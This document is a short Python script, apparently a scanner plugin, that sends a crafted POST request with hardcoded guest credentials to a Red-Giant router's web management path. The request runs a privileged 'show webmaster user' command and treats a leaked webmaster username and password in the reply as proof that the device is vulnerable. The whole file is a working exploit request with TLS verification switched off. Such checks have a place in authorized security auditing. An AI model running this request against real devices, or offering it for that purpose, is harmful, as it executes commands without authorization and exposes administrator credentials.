import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"WEB_VMS/LEVEL15/"
	body="command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant."
	headers={'Authorization': 'Basic Z3Vlc3Q6Z3Vlc3Q='}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "webmaster level 2 username guest password guest" in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
